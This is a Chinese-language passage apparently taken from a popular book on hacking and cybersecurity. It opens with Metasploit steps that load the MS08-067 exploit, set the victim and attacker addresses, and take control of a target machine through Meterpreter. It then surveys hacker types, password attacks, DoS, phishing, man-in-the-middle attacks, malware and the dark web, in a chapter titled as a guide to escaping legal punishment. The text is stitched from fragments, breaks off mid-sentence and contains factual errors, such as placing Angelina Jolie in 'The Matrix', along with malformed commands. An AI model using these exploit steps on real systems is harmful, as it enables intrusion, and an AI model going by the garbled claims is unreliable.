首先，你需要选择需要使用的漏洞类型。你应该考虑使用的一个很好的漏洞是 MS08_067_netapi 漏洞。你需要通过输入以下命令将它加载到系统：

```bash
msf > exploit/windows/smb/ms08_067_netapi
```

一旦其进入系统，就是时候添加一个进程来简化屏幕捕取了。Metasploit 的 Meterpreter 载荷可以让操作变得更容易。要获取并将其加载到你的漏洞中，你需要输入以下代码：


```bash
msf > (ms08_067_netapi) show options
```

此时，你应该能看到受害者（victim，或 RHOST）以及攻击者（或你，LHOST）的 IP 地址。当你想要接管另一个计算机系统时，知道这些地址很重要，因为它们的 IP 地址将让你直接到达那里。显示你的 IP 地址和目标 IP 地址以便接管目标系统，需要的代码包括：

```bash
msf > (ms08_067_netapi) set RHOST 192.168.1.108
msf > (ms08_067_netapi) set LHOST 192.168.1.109
```

现在，如果你正确执行了整个流程，你应该已经漏洞利用了另一台计算机并将 Meterpreter 放入其中。目标计算机现在处于你的控制之下，你可以按照以下步骤获取你需要的截图。

### 步骤 2：获取截图

```meterpreter
meterpreter > getpid
```

### 什么是黑客行为？

当你想到黑客行为（hacking）时，你可能会想象成有人暴力敲击键盘，在控制某人的电脑时放大画面，并说“我进来了”或“攻击开始”之类的话。或者“hacking”这个词让你联想到入侵某人的 Instagram 账户。

“hacking”一词带有先入为主的含义，大多数人并不完全理解黑客方法中的整个理念。黑客在这方面有着传奇般的声誉。然而，有一个大多数人不知道的侧面：伦理黑。你听不到关于伦理黑的报道，但每天有具有相同工作描述的人在与恶意黑客作斗，而他们却背了坏名。

众所周知的“hacking”是指尝试未经授权访问数据或系统。所以是的，从技术上讲，入侵前任的 Instagram 来阅读他们的私信是黑客行为的一种，但该术语适用于在黑客领域拥有技术知识的人。人类不仅尝试获取访问，还为了防止他人获得非想要的访问。

### 黑客的历史

破解可以追溯到60年代，当时在1961年，麻省理工的一群学生破解了他们的模型火车以修改其功能。这就是这个词的来源。最初，破解指的是探索和改进某些东西。破解甚至与计算机没有直接关系！

在70年代，电话黑客（或“phackers”）利用电话的运行特性获取免费电话而亮相，尽管他们相当罕见。当时，计算机黑客并不流行，因为很少有人拥有个人电脑。

这种情况在80年代发生了变化，个人电脑催生了第一批计算机黑客。这并不意外，因为总会有人想要为了自己的利益去捣破坏这些产品。同样，当有人要捣破坏产品时，就会有人来保护它。计算机黑客的诞生也导致了伦理黑客的诞生。80年代是我们第一次看到黑客进入系统以获取个人利益的十年。这种新犯罪类型自然需要新的立法。1986年，《联邦计算机欺诈和滥用法》首次编写。该法案规定，任何人访问金融机构、政府机构或涉及外国贸易或通信的组织使用的计算机都是犯罪。这主要是由公众对电脑的使用增加而驱动的。

90年代以与黑客相关的首批高知名度逮捕为标志。Kevin Mitnick、Kevin Poulsen、Robert Morris 和 Vladimir Levin 是首批因盗取财产软件和领导数字抢劫而被捕的人。这也是“crackers”（破解者）一词，它指的是那些



“破解”数字加密代码（例如密码等）开始被广泛使用。

在21世纪200年代后期，针对eBay、亚马逊和微软等大型公司的黑客攻击经常占据新闻头条。当2000年初消息传出15岁的乔纳森·詹姆斯（Jonathon James）入侵了国际空间站的系统时，这种情况尤为突出。

数字恶意软件比以往任何时候都更加先进。黑客行动主义、勒索软件和高度敏感的文件泄露是一个持续存在的问题。在现代，比以往任何时候都更需要伦理黑客来防御和避免黑客攻击。细节对所有人开放，让黑客攻击变得更加容易，但这并不重要。

这同时也让安全变得负担得起。

黑客行为并不总是非黑即白的，有各种类型的黑客和不同类型的黑客行为。黑客主要分为合法、不道德和介于两者之间。

### 伦理黑客

在现实世界的案例中，会将伦理黑客称为团队中的“消防员”；他们扑灭火灾并拯救无辜的生命。更多时候，他们受政府或执法机构雇佣，保护数据并处理对个人或公司造成的任何伤害。小企业可以聘佣伦理黑客来保护公司数据不被恶意利用或遭受恶意黑客的攻击。

### 不道德黑客 - 破解者（Cracker）

不道德黑客也被称为破解者（cracker），是指在所有者不知情或不同意的情况下进入设备非法获取信息和资产的罪犯。这种攻击的意图是恶意的。这类黑客会导致财务损失、盗取机密数据、侵吞资金、破坏业务以及传播错误数据等。

### 灰帽

然后，黑客并不完全符合伦理或不道德；他是那种为了接济穷人而偷东西的人。他处于另外两种黑客之间的灰色地带。“灰帽”（grey hat）这个名称就源于此。灰帽黑客的一个例子是被雇佣保护特定数据库，随后利用访问机密数据的机会获取个人利益。你可能不会认为他们是罪犯，但他们很快不会获得任何奖励。接着你有“黑客行动主义者”（hacktivists），如匿名者（Anonymous）等团体，他们利用黑客行为传递政治和社会信息。最后，还有“小子”（kiddies）或无技能的人员，他们使用现成的工具访问系统。这就是当你猜某人的Facebook密码时，因为你想看看他们昨晚是否在他们所说的地方。

### 黑客攻击类型

如你所见，黑客攻击并不像猜别人的密码并登录账户那么简单。实际上，有许多你需要熟悉的黑客攻击类型。

### 钓鱼攻击（Phishing）

钓鱼的概念源于日常的钓鱼活动。这些攻击使用电子邮件有时是电话冒充合法机构，以获取可能损害个人或业务的重要信息。因此，他们抛出钩来“钓”受害者。这通常通过先告诉受害者他们是一个受信任的组织并索要机密数据来实现。

第一起钓鱼诉讼于2004年针对一名加州青少年提起，他创建了“美国在线”（America Online）网站的副本，并在那里从访问者处获取信用卡信息。最早且最流行的钓鱼邮件之一是臭名昭昭的“尼日利亚王子”邮件，这是一封来自陷入困境的“王子”的邮件，需要你的帮助来回到他的百万财富。今天，我们大多数人不会落入尼日利亚王子的诈骗，但钓鱼仍然存在，并且是数百万互联网用户面临的问题。盛行的钓鱼邮件大多易于识别。它们具有紧迫感、不寻常的发送者和可疑链接。当网站被复制并看起来像真的一同时，情况就会变得复杂。银行网站通常是钓鱼目标，因为它们拥有大量的信用卡号和敏感信息。

### 病毒（Virus）

病毒的目的是破坏网站上的资源。就像在人体一样，病毒可以改变形式、破坏“健康”程序并自我传播。就像在我们身上一样，有许多病毒可以攻击你的恶意软件。

Topher Crypter是最危险的病毒类型之一，因为它能够完全接管计算机，导致进一步病毒的扩散。Topher Crypter的一个著名例子是特洛马病毒。

变异病毒（Metamorphic Virus）可以编写、重写和编辑自己的代码。它是最具传染性的病毒，如果不及早检测，可能会损坏计算机和数据。

多态病毒（Polymorphic Virus）与变异病毒相似，但它会复制自己；变异病毒可以重写代码，而多态病毒只是在轻微修改的基础上复制其原始代码。

宏病毒（Macro Virus）使用与Microsoft Word或Excel等软件程序相同的语言编写。每当打开应用程序时，它都会启动自动的操作序列。

集群病毒（Cluster Virus）使得系统中的每个程序似乎都受到了影响，而实际上只有系统中的一个程序。它造成了集群的幻象，可以通过找出病毒的原始“载体”来移除。

隧道病毒（Tunneling Virus）针对杀毒软件工作。它在后台运行并位于杀毒软件之下。当杀毒软件检测到病毒时，杀毒软件只会重新安装自己，结果却是以隧道病毒的形式安装。

隐藏病毒（Stealth Virus）利用其机制避免杀毒软件的任何检测。隐藏病毒会隐藏在内存中并隐藏它对任何文件所做的更改。

扩展病毒（Extension Virus）会隐藏在网站或浏览器扩展中，并通过那里创建更改。

### Cookie 窃取

Cookies是存储在你计算机上的文件，由浏览器用于保存有关你访问的网站或所的任何操作的有用信息。

会话Cookie（Session cookies）是临时的，一旦关闭浏览器就会被删除。这些是会话Cookie。某些Cookie持续存在你的浏览器中直到过期。这些被称为持久性Cookie（persistent cookies）。网站使用Cookie来定制你的体验，但黑客可以窃取它们。

### UI劫持（UI Redress）

UI劫持也称为点击劫持（clickjacking），是通过掩盖点击来获取访问。用户可能认为他们正在点击一个简单的链接，但会被重定向到另一个网站。这在社交媒体或电子邮件上可能会迅速失控。

### DNS欺骗（DNS Spoofing）

域名服务器欺骗是一种通过重定向点击到欺诈网站进行的攻击。在那里，用户被认为他们向原始网站登录用户名和密码。但实际上，他们正在将信息交给执行欺骗的黑客。执行DNS欺骗的方法有很多，例如中间人攻击（服务器和用户之间的交互被劫持）或DNS服务器入侵（服务器直接受到攻击）。

上述示例都是恶意黑客使用的黑客类型，但伦理黑客也与之共同工作。为了防止和“修复”这些攻击，伦理黑客必须了解它们是如何工作的，这就是为什么伦理黑客必须接受所有黑客类型和方法的教育。

成为黑客需要技能，讽刺的是，不道德和伦理黑客将使用相同的教育和工具。唯一的区别在于一个将“力量”用于恶，而另一个用于善（或介于之间）。这就像经典的超级英雄与反派组合蝙蝠和小小丑。要成为一名成功的伦理黑客，你必须理解恶意黑客。

### 伦理黑客的阶段

涉及伦理黑客时，通常有五个不同的阶段：

- 侦察（Reconnaissance）：收集信息的过程。在这个阶段，黑客收集有关目标系统的相关信息。这些信息包括检测服务、IP配置、PC规格和密码数据。
- 扫描（Scanning）：黑客开始主动探测目标机器或网络，寻找可以主动利用的漏洞。
- 获取访问（Gaining Access）：这是关键部分之一。在这个阶段，扫描期间检测到的漏洞将通过各种方法被利用——即恶意黑客可能使用的相同方法。然而，伦理黑客将借此了解入口的弱点。黑客将尝试在不引起任何警报的情况下进入目标系统。




**维持访问** - 一旦黑客获取了访问权限，就会希望维持这种访问。在恶意黑客中，这用于获取系统访问权限以便进行利用和攻击；而在伦理黑客中，这一阶段被用于访问你想要保护的系统。

**清除痕迹** - 最后，恶意黑客想要掩盖自己的足迹以防被安全人员发现。相比之下，伦理黑客想要掩盖足迹是为了不被不道德的黑客发现。过程完全相同。黑客可以使用隧道协议或修改日志文件来掩盖足迹。

正如我们所见，黑客与安杰莉娜·朱莉主演的《黑客帝国》等电影让我们相信的含义完全不同。虽然为了猛烈敲击键盘几个小时看起来很酷，但你必须受过并在，才能成为一名黑客。如果你想当伦理黑客，你还需要具备特定程度的社会经验，因为你必须在对手采取行动之前预测他们的下一步动作。这是国际象棋与战争的结合，是一种独特的艺术形式。

## 第二章：它的工作原理以及如何逃脱法罚

要完全理解黑客的工作原理，比一个章节需要的内容得多。黑客技术并不是一种可以通过阅读来完全学会的技能；它更像是一项通过时间和实践、凭借发明的头脑和一丝恶作剧精神而完善的实践性工作。

黑客与计算机或程序代码（一组在后台运行并构成软件的指令）为交道工作。同时，许多黑客知道如何编写代码，下载很多代码，并使用他人编写的代码。主要要求是如何运行这些代码并对其进行调整以处于自己的优势。对于那些利用它窃取密码、秘密、身份、财务信息或产生大量流量的恶意黑客来说，目标网站需要关闭。

### 窃取密码

密码很容易破解，因为人类是非常容易预测的。在涉及到密码时，我们认为自己是独一无二的，但很容易被猜。例如，女性经常用个人名字作为密码——想想孩子、亲戚、旧情人——而男性则倾向于爱好。我们使用最频繁的数字是 1 和 2，它们通常被放在密码的末尾。大多数情况下，我们使用一个单词后跟一些数字，如果网站坚持包含大写字母，我们就把它放在单词开头，然后抱怨这个网站为了让我们经历这一切是真烦人。

但黑客是如何获取我们的密码的？嗯，有几种实用的技术。

试错法被称为**暴力破解攻击**，就是你尝试字母和单词的各种组合来尝试猜测正确的密码。这之所以行之通，是因为正如之前提到的，在密码类型方面，我们是非常容易被预测的。

另一种类似的技术被称为**字典攻击**；黑客使用一个包含字典中所有单词的文件，程序尝试尝试所有它们。这就是为什么通常建议在密码中将数字作为单词添加，但这并不意味着你的 “sunshine22” 密码是无防黑客攻击的。

第三种技术是**彩虹表攻击**。你计算机系统中的密码在加密时经过了哈希处理（使用数学函数从文本字符串生成一个或多个值）。每当用户输入密码时，它都会被与一个已存储的值进行比较，如果它们匹配，你就可以进入网站或应用程序。由于更多的文本可以产生相同的值，只要加密方式相同，我们输入什么字母并不重要。把它想象成门和钥匙。你用为那把锁制造的钥匙进入门，但如果你是一个擅长开锁的锁匠，你就不需要钥匙也能进入。

### 如何保护自己免受密码攻击

使用**加盐技术**。这指的是在哈希函数的输入中添加简单的随机数据。将密码与盐结合然后进行哈希处理的过程被称为“加盐”。例如，密码可以是 “sunshine22”。




监控网络活动 - 使用防火墙并跟踪你的数据使用情况。任何数据流量的激增都是后门活动的明确信号。

更改你的默认密码 - 当网站分配默认密码时，我们可能会发现自己只是太懒了，不想花那所需的 30 秒去修改它。去做吧。你可能没有使用最先进的安全系统来锁上后门，但至少你没有用一个霓虹灯牌写着你的密码并让门敞开。Freckles 可能是你小狗的名字，但它不能作为所有东西的密码。一个常见的抱怨是：“我会忘记它。”把它写下来。与大众认知相反，黑客不会进入你的家里寻找那张纸，但他们会进入你的电脑。哪种方案看起来更安全呢？

### 用于分布式拒绝服务（DDoS）攻击的僵尸计算机

听起来超级酷，对吧？其实并非如此。基本上，当黑客入侵计算机并控制其执行非法活动时，计算机就变成了僵尸。最棒的部分（对黑客来说，而不是对你来说）是，你完全不知道这一切正在发生。你仍然会正常使用它，尽管它的速度可能会变慢。然后，你的电脑会突然开始发送大量的垃圾邮件或与你无关的社交媒体帖子。DDoS 攻击非常美妙（对黑客来说，而不是对你来说），因为它们同时在多台计算机上运行，数量可以达到数百万。百万台僵尸计算机在互联网上盲目地游荡，向目视范围内的一切发送垃圾信息，感染其他计算机。电脑被感染仅用于发送垃圾邮件的版本只是轻量版。DDoS 攻击也可以用于犯罪活动，这就是为什么预防它们至关重要。

### 如何防范 DDoS 攻击

规模较大的企业需要更具实质性的 DDoS 攻击防护，我们将详细介绍这一点，但即使对于个人来说，一半的保护在于预防。

理解警示信号——电脑变慢、连接不稳定或网站关闭都是 DDoS 攻击正在发生的迹象。

### 你能做什么？

- 拥有更多带宽 - 这确保你有足够的带宽来处理恶意活动引起的大流量激增。

- 使用防 DDoS 硬件和软件模块 - 使用网络和 Web 应用防火墙保护你的服务器。硬件供应商可以通过监控如何将不完整的连接和特定的软件模块添加到 Web 服务器软件中来添加软件保护，从而提供 DDoS防护。

- 智能点击 - 这应该是不言而明的，但对于那些需要听到它的人——带有“不，谢谢”按钮的弹出广告是极其讨厌的小东西。直接退出网站，不要点击广告上的任何内容，特别是“不，谢谢”按钮，否则你会立即激活一个恼人的下载，现在你的电脑就变成了一个僵尸。

### 中间人攻击

当你在线时，你的电脑会进行一些往来交易。你点击一个链接，你的电脑让全球的服务器知道你正在请求访问该网站。接收接收并授予你对请求网站的访问权限。这一切都在纳秒内完成，我们并不会思考。你的电脑和 Web 服务器之间的那几纳秒被赋予了一个对你的电脑和服务器唯一的且私有的会话 ID。然而，黑客可以劫持这个会话并伪装成电脑，从而获取用户名和密码。他变成了中间人，劫持你的会话来获取信息。

 如何保护自己免受中间人攻击

高效的杀病毒软件和最新的软件对防止劫持非常有帮助，但还有一些建议可以帮助你避免成为受害者。

- 使用虚拟专用网络 - VPN 是一个私有的加密网络，充当私有隧道并严重限制了黑客获取你信息的权限。Express VPN 还可以掩盖你的位置，让你无论在何处都能匿名浏览网页。

- 防火墙和渗透测试工具 - 使用主动防火墙和渗透测试工具保护你的网络。

- 插件 - 仅使用来自可靠来源且评分良好的插件。

- 确保你的通信安全 - 使用双重验证程序，并在有人从不同的电脑登录你的账户时接收警报。

### Root 权限

Root 权限是访问 Unix、Linux 和类 Unix 系统中特定命令的授权。这让黑客对系统拥有完全控制权。Root 权限通过设计良好的 rootkit（根内核包）软件授予。设计良好的 rootkit 软件会访问所有内容并隐藏任何存在的痕迹。这在所有类 Unix 系统中都是可能的，因为它们的设计采用了树形结构，其中所有单元都分支向一个根（root）。

原始 Unix 操作系统设计于个人计算机出现之前的，当时所有计算机都通过非常简单的终端连接到一台主机计算机上。这需要一个大型、强大的主机以便在用户同时使用系统时来分离和保护文件。

黑客通过使用 rootkit 获取特权访问来获取 Root 权限。可以通过密码授予；密码保护是限制意外 Root 权限的重要组成部分。rootkit 也可以通过恶意下载自动安装。处理 rootkit 可能是困难且昂贵的，因此最好保持保护，并将 Root 权限攻击的可能性降至最低。

# 如何保护自己免受 Root 权限攻击

优质的杀病毒软件是所有电脑推荐的标准配置之一，无论是个人还是企业。优质的杀病毒软件有助于系统加固，使其安装 rootkit 变得更加困难。

- 最小权限原则 - PoLP 的理念是任何程序或用户都应该仅具有执行程序功能所需的最小权限。仅给予程序执行任务所需的最少权限可以提供更好的保护。例如，在公司中，工作仅仅是回复邮件的用户应该只有访问邮件的权限。如果用户的电脑受到攻击，它无法传播得远。如果该人员拥有 Root 权限，攻击将遍整个系统。

- 禁用 Root 登录 - 大多数 Unix 和 Linux 操作系统的服务器都带有 Root 登录选项。使用 Root 登录可以让访问变得非常容易，如果你将其与弱密码结合，你就是在如履薄冰。禁用 Root 访问选项可以让所有用户远离 Root 登录。

- 阻止暴力破解 - 部分程序会为你拦截可疑 IP 地址。它们会检测恶意 IP 并阻止攻击。虽然手动检测是最安全的方法，但这是一个漫长的过程；设计用于拦截恶意 IP 的程序可以大幅节省时间并帮助防止 Root 攻击。




互联网改变了企业开展业务的方式。计算机和网络改变了从制造、运营、通信到财务、分销、营销和客户服务的业务流程。在几乎所有与业务相关的过程中，经常可以以某种方式发现计算机系统和互联网的存在。

计算机技术的进步、更廉价的硬件以及互联网的普及为技术的下一个大趋势铺平了道路：物联网。曾经是“笨的”且需要人工干预的物体，通过赋予它们收集和传输数据以及响应远程命令的能力已变得“智能”。预计物联网将继续快速增长，同时改变人类的生活和企业的运营。

IoT 设备连接到互联网以执行其职责。因此，它们成为了各种动机网络攻击的目标。由于物联网是一项相对新的技术，这意味着 IoT 设备尚未配备计算机所具有的网络安全措施。此外，IoT 设备被用于执行要求严苛的任务，包括访问控制和辅助医疗。

### 什么是网络安全？

保护计算机系统或网络免受不利影响（例如对计算机硬件、软件、数据或这些元素所提供的服务的盗取或损害），被称为网络安全。网络安全也被称为计算机安全和 IT 安全（信息技术安全）。由于互联网、计算机和无线网络使用和依赖程度的快速增加，网络安全多年来一直在快速演变。

其他易受网络攻击的设备的使用，如智能手机、智能电视以及属于“物联网”（IoT）类别的设备，也促成了对网络安全快速演变的需求。围绕互联网、计算机、网络和智能设备使用的技术和政治问题非常复杂，给网络安全领域带来了许多挑战。

由于技术的快速变化性质和其他因素，网络安全始终在演变。结果是网络安全方法、工具、风险管理方法、技术、最佳实践和培训总是在变化。网络安全威胁随着技术的演进以及易受这些威胁的设备、软件和网络的使用而不断进步。许多组织甚至个人都高度重视网络安全，以保护他们宝贵的硬件、软件、数据、服务和组织目标。

由于存在数据泄露的风险（数据泄露可能会从许多方面瘫痪企业），网络安全一直是企业关注的重点。此类泄露通常会导致高度敏感数据的丢失，从而使公司损失收入、竞争优势、声誉和消费者信任。预计一次数据泄露将为一家公司带来约 360 万美元的损失，使数据安全成为任何组织的优先事项。

## 网络攻击与漏洞

计算机、硬件、智能设备、软件或网络在设计、实施、内部控制或运行中的缺陷会导致暴露于网络攻击。常见漏洞与暴露（Common Vulnerabilities and Exposures，CVE）是一个记录了此类针对网络威胁已知漏洞的数据库。至少存在一个活跃的攻击或存在的利用程序就被称为“可利用的漏洞”。各种手动和自动工具被用于识别网络攻击的漏洞。

当涉及到计算机和网络时，攻击很大程度上试图暴露、禁用、更改、窃取、破坏或获得对资产使用的权限。任何试图针对计算机系统、网络、基础设施和个人设备的此类进攻策略都可以被称为网络攻击。网络攻击可以由单个个人或具有恶意意图的团体实施，使硬件、数据和功能面临风险。

根据攻击的性质及其威胁，网络攻击可以被归类为网络战争或网络恐怖主义。此外，网络攻击可以由在匿名状态运行各种社会和主权国家实施。在网络攻击期间，易受的系统和设备被黑入，以实现攻击者的恶意意图。网络攻击的规模也可能变化，从单一计算机、设备、个人或公司作为主要目标，到整个国家的基础。

## 信息安全文化

员工的行为在建立公司网络安全方面发挥着关键作用。公司文化和实践的改变与改进可以帮助员工有效实现信息安全。员工有时并没有意识到他们是公司实现网络安全努力不可或的一部分。结果，他们的行动可能与公司的网络安全目标不一致。

公司应该不断改进其信息安全文化，确保员工理解他们需要的角色。

这一过程是永无止境的，处于变化的评估和维护循环。管理公司信息安全文化的五个步骤是预评估、规划、运营规划、实施和后评估。

预评估带来了对公司信息安全文化和政策的意识，并突出了可能使其易受网络威胁的行为。流程的下一步是战略规划，即创建一个具有明确目标的计划。运营规划涉及通过改进内部沟通、安全意识和培训向更好的文化努力。

实施由四个阶段组成：管理承诺、与员工沟通、为员工提供课程以及员工承诺。经理首先承诺在公司实施更好的信息安全实践，然后向员工传达公司的意图。然后为员工提供有关信息安全的教育和培训。

最后，员工致力于带来改进和满意的信息安全文化。最后一步是后评估，它评估规划和实施的效果如何，并识别出任何待解决的问题。

## 易受网络攻击的系统

依赖计算机系统的个人、企业和组织数量迅速增长。这导致了面临网络攻击风险的系统增加。此类脆弱实体遍布各个行业，几乎所有行业在不同水平上都是脆弱的。

## 金融系统

金融机构和监管机构的计算机系统面临黑客攻击的高风险。美国证券交易委员会、投资银行和商业银行是黑客寻求非法利益和市场操控的主要目标。此外，任何存储或接受信用卡号、银行账户信息和证券账户的网站或移动应用程序也面临被黑风险。

黑客和黑客团体对攻击此类机构的网络和网站有极大兴趣，因为他们可以通过购买、转账以及将获取的数据出售给黑市上的利益方来获得即时财务回报。ATM 和店内支付系统也一直是黑客的目标，其目标是收集客户的 密码和账户详情。




表面网（Surface web）约占整个互联网的百分十，包括 Google 和其他搜索引擎。你可以使用关键词搜索不同的内容进行阅读、销售或购买。接着是深网（Deep web），它是你可以存储大多数用户无法访问的信息的地方。这包括你通过密码保护的内容，例如银行账户、订阅服务和某些医疗信息。网页的大部分由这类信息组成。第三个区域是暗网（Dark web），普通互联网用户无法访问。你无法通过 Firefox、Opera 和 Google Chrome 访问这个网络空间，它可以包含任何信息。“暗（dark）”一词之所以归于这个网络空间，是因为其访问受到限制。

你可能在好奇对于普通用户来说，暗网是否完全非法。坦率地说，答案是否定的。进入暗网不属于非法活动，但你在暗网上的行为可以被归类为合法或非法。你可以通过 Tor 匿名浏览器访问暗网。你可以像下载 Google Chrome 和 Firefox 一样下载它。区别在于它的工作原理不同。当你使用 Tor（洋葱路由）时，你必须穿过不同的叠加网络。就像洋葱一样，它有几层结构需要通过。Tor 的速度通常比其他浏览器慢。如果你可以访问虚拟专用网络（VPN），确保最佳安全性是明智之举。

为了消除长久以来的疑惑，Tor 并不是暗网，而是访问暗网的工具。此外， Tor 也可访问 Google 和 Yahoo 等通用网络空间，使你在表面网上的访问变得更加安全。暗网并不被视为非法活动的场所，而是被视为一个高在线隐私水平的地方。你可以在暗网上购买非法药物并将其邮寄到你的邮政地址，而不会向任何人透露包里装了什么。使用暗网想要实现的终极目标取决于你的需求，以及你是否准备好承担实施非法行为的风险。

对于伊朗等国家的居民来说，政府对互联网的控制达到了极端水平，暗网成为了一种必然（注：此处原文意为必要/对需，根据语境可译为“必需品”）。这些国家的居民通过暗网访问 Facebook 和 Twitter。他们登录了官方为受审查用户提供的洋葱版本版本的站点。

## 第四章：

## 常见网络攻击

随着黑客不断开发最新的、创新的方法来发起攻击并威胁不同计算机网络的安全，网络攻击正变得日益复杂。攻击变得如此复杂，以至于变得难以检测。因此，攻击比以往任何时候都更具致命性。

网络安全并不取决于组织的大小。无论你是经营初创企业还是一家价值数百万的公司，你都应该意识到网络攻击有多大的风险。网络攻击的兴起引发了一个问题：为什么黑客要攻击网络空间？这种残忍攻击背后的动机是什么？一种普遍的观点是，利益驱动着他们对大公司的计算机系统发起高知名度的网络攻击。还有人认为此是为了间谍活动。本章将阐明黑客在渗透个人计算机或企业计算机背后的动机。

大多数情况下，攻击是一种旨在渗透信用卡和借记卡详情的泄露行为。这些信息随后会在暗网上被售卖，以赚取巨额利润。故事并未于此结束。在大多数情况下，利润只是掩盖更大、更深层次目的的烟雾弹。

间谍活动也与公司数据或国家官方网站的数据泄露有关。这类攻击通常旨在从受害者那里获取信息。在通过网络攻击进行间谍活动时，许多方面保持不变，包括监控在网络空间运行的通信。间谍活动中另一种流行的技术被称为窃取机密。早些，，任务由物理进入空间并破坏组织内部某些资产的个人完成。为了让你感受一下这一切是如何发生的，我将举一个好莱坞的例子。如果你是汤姆·克鲁斯及其间谍惊悚片的粉丝，你可能一定熟悉伊森恩（Ethan）这个角色，他总是执行某些渗透设施并窃取重要文件的任务，这些文件可以扭转局面。“间谍（Spy）”是他们用来形容这类人的词。如今，情况发生了变化。物理领域几乎什么都没有剩下了。窃取大量重要信息的技巧更多是关于“电子化”。计算机有能力消耗曾经存储在公司账本和大量纸质上的数十亿文件。

针对计算机系统、网络、基础设施或个人设备的攻击性行动，旨在更改、窃取或破坏数据和计算机系统，被称为网络攻击。虽然每种网络攻击都不同，但它们存在许多相似之处，例如所使用的方法和策略。许多犯罪分子在考虑目标和攻击性质的同时，使用过去被证明成功的黑客技术发动网络攻击。在本章中将深入讨论各种类型的网络攻击，同时阐明它们通常造成的损害。

## 拒绝服务 (DoS) 与 分布式拒绝服务 (DDoS) 网络攻击

DoS 攻击通过过载计算机系统的资源来攻击计算机系统，影响系统响应服务请求的能力。同样，DDoS 攻击也会过载计算机系统的资源。然而，DDoS 攻击是使用多个被攻击者感染了恶意软件的主机发起的。

与许多网络攻击不同，拒绝服务攻击不会通过增加或获取计算机系统及其数据的访问为攻击者提供直接利益。拒绝服务是 DoS 或 DDoS 攻击的目的，而不是控制或数据窃取。某些企业使用拒绝服务攻击来干扰竞争对手提供的服务。此外，DoS 或 DDoS 攻击还被用于导致系统停机，使系统离线。

### TCP SYN 泛洪攻击

攻击者在此类攻击中利用传输控制协议（TCP）三次握手的缓冲区空间。目标系统会被攻击者设备的连接请求淹没。然而，攻击者设备不对目标系统的回复做出响应。结果是目标系统在等待响应时超时，导致其无法使用甚至崩溃。

### 呆网鱼攻击 (Smurf Attacks)

攻击者利用 ICMP 和 IP 伪造在呆网鱼攻击中使目标网络被流量饱和。该方法使用了指向广播地址的 ICMP 回显请求。攻击者从伪造的 IP 地址创建 ICMP 回显请求，让广播地址产生目标受害者正在发送请求的印象。多个请求发送到广播地址，目标地址接收到大量响应将其淹没。伪造的 ICMP 回显请求是由攻击者自动大量生成的，导致严重的网络拥塞，迫使目标网络拒绝服务。

### 死亡探测攻击 (Ping-of-Death)

IP 允许的最大尺寸限制为 65535 字节。攻击者使用代表目标系统的碎片 IP 包。这些 IP 包会导致崩溃和缓冲区溢出，破坏目标计算机网络提供的服务。然而，可以通过防火墙成功克服，使任何碎片 IP 包符合允许的最大尺寸。

### 僵尸网络 (Botnets)

黑客感染数百万系统并获得其控制权，将其用于发起 DDoS 攻击。目标系统或网络会被受攻击者控制的机器人或僵尸系统攻击。攻击者通常使用僵尸网络淹没目标系统的带宽及其处理能力。由于使用了位于多个地理位置的受感染机器人或计算机系统，DDoS 攻击通常难以追踪。




此类恶意软件会在接收者打开或下载它们时感染计算机。某些网络钓鱼邮件包含指向网站的链接，诱骗接收者下载或安装恶意软件，或提交他们的个人信息。

鱼叉式网络钓鱼（Spear phishing）是一种有针对性的网络钓鱼形式，攻击者会对目标进行详细研究，以产生往往重要且具有个性化的信息。因此，鱼叉式网络钓鱼很难识别，许多接收者无法保护自己的计算机和网络免受攻击。黑客在鱼叉式网络钓鱼中使用一种常用的简单方法是伪造邮件的“发件人”（From）部分，使其看起来是由目标认识的人发送的，例如同事或公司管理层。

鱼叉式网络钓鱼攻击者还通过克隆网站来增加其尝试的可信度。这种做法涉及复制合法网站以误导目标，使其尝试在克隆网站上提交敏感信息（如用户名和密码），攻击者随后会利用这些信息访问目标在合法网站上的账户。

反击网络钓鱼最简单的方法之一是使用批判性思维。仔细检查电子邮件和发件人的电子邮件地址通常足以识别网络钓鱼尝试。如果可疑邮件包含链接，用户只需将鼠标悬停在链接上而不点击，即可检查链接指向的 URL。邮件头信息（如“回复至”Reply-to）也有助于识别网络钓鱼邮件，因为它们直接指向发件人的电子邮件，随后可以轻松进行检查。此外，邮件中包含的链接和附件可以在沙箱（Sandbox）环境中安全地检查。

## 中间人攻击 (MitM Attacks)

此类攻击将攻击者置于客户端与服务器的通信之间，使其能够干扰并篡改这些通信，包括请求和响应。存在多种类型的中间人网络攻击。

## 会话劫持 (Session Hijacking)

攻击者通过劫持受信任客户端与网络服务器之间的会话发动此类攻击。攻击计算机使用信任客户端的 IP 地址，而服务器在认为正在与客户端通信的情况下继续会话。这种由攻击引起的混乱使攻击者能够与服务器通信并执行其意图，而实际客户端或服务器并不知道发生了什么。

## IP 伪造 (IP Spoofing)

攻击者通过使用伪造 IP 地址欺骗系统以获取系统的访问权限。由于伪造 IP 地址的存在，系统认为正在与受信任实体通信。在某些安全措施较差的环境中，IP 数据包被用于将伪造 IP 源地址发送到目标主机，这些主机接受并响应攻击者的请求。

## 重放攻击 (Replay)

此类攻击通过冒充对话参与者或已发生的通信威胁来实施。攻击者保存之前发送的消息并再次发送，以冒充对话的参与者之一。然而，通过检查消息和随机数符（nonce）的时间戳，可以轻松识别并处理重放攻击。

## 恶意软件攻击 (Malware Attacks)

任何未经用户或该计算机管理员同意而安装在计算机中的非意愿软件统称为恶意软件。这些恶意软件附着在系统的合法代码及其实用应用程序上，同时在互联网上复制。存在多种类型的恶意软件，具有各种功能和意图。

## 宏病毒 (Macro Viruses)

此类恶意软件会感染 Microsoft Word 和 Excel 等常用软件。它们通过附着在可靠应用程序的初始化序列来感染计算机。它们在用户毫无察觉的情况下安装在计算机上，因此没有经过用户的同意。当毫无防备的用户打开特定应用程序时，附在上面的病毒就会接管应用程序，并通过附着到计算机的系统代码来复制自己。

## 文件感染病毒 (File Infectors)

这些病毒通常通过附着在可执行文件 (.exe) 中秘密溜入计算机。当毫无防备的用户加载可执行文件时，病毒就会在不知情的情况下安装到计算机上。某些感染器会创建一个与可靠应用程序同名的病毒文件作为可执行文件。当文件被打开时，病毒就会行动并执行其预定程序。

## 引导记录或系统感染病毒 (Boot-Record or System Infectors)

这些病毒附着在位于计算机硬盘上的主引导记录（MBR）上。病毒在系统启动时被激活。它查看计算机的启动区并将自身加载到系统内存中，并在那里感染其他磁盘和计算机。

## 多态病毒 (Polymorphic Viruses)

病毒使用不同的加密和解密序列来隐藏，使其进入并感染特定的代码区域。这些病毒被反复加密和解密，由于其源代码不断变化，使其效力减弱。然而，它们非常难以检测。

## 隐形病毒 (Stealth Viruses)

